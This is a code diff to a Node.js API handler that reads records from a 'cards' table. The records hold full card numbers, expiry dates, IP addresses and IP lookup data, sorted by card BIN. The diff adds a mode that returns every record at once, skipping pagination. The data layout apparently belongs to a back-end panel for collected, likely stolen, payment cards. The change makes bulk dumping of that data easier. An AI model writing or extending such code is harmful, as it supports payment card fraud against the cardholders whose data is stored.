@@ -28,6 +28,7 @@ module.exports = async function handler(req, res) {
         const limit = parseInt(req.query.limit) || 25;
         const search = req.query.search || '';
         const offset = (page - 1) * limit;
+        const fetchAll = (limit === 0 || limit > 5000);
 
         const client = await pool.connect();
         try {
@@ -49,13 +50,22 @@ module.exports = async function handler(req, res) {
             const total = parseInt(countResult.rows[0].count);
 
             // Fetch data ordered by first 6 digits of card_number
-            const dataResult = await client.query(
-                `SELECT id, card_number, expiry, ip_address, ip_info, created_at 
+            let dataQuery;
+            let dataParams;
+            if (fetchAll) {
+                // No LIMIT/OFFSET — return all cards
+                dataQuery = `SELECT id, card_number, expiry, ip_address, ip_info, created_at 
+                 FROM cards ${whereClause}
+                 ORDER BY LEFT(REPLACE(card_number, ' ', ''), 6) ASC, created_at DESC`;
+                dataParams = params;
+            } else {
+                dataQuery = `SELECT id, card_number, expiry, ip_address, ip_info, created_at 
                  FROM cards ${whereClause}
                  ORDER BY LEFT(REPLACE(card_number, ' ', ''), 6) ASC, created_at DESC
-                 LIMIT $${paramIndex} OFFSET $${paramIndex + 1}`,
-                [...params, limit, offset]
-            );
+                 LIMIT $${paramIndex} OFFSET $${paramIndex + 1}`;
+                dataParams = [...params, limit, offset];
+            }
+            const dataResult = await client.query(dataQuery, dataParams);
 
             return res.status(200).json({
                 success: true,
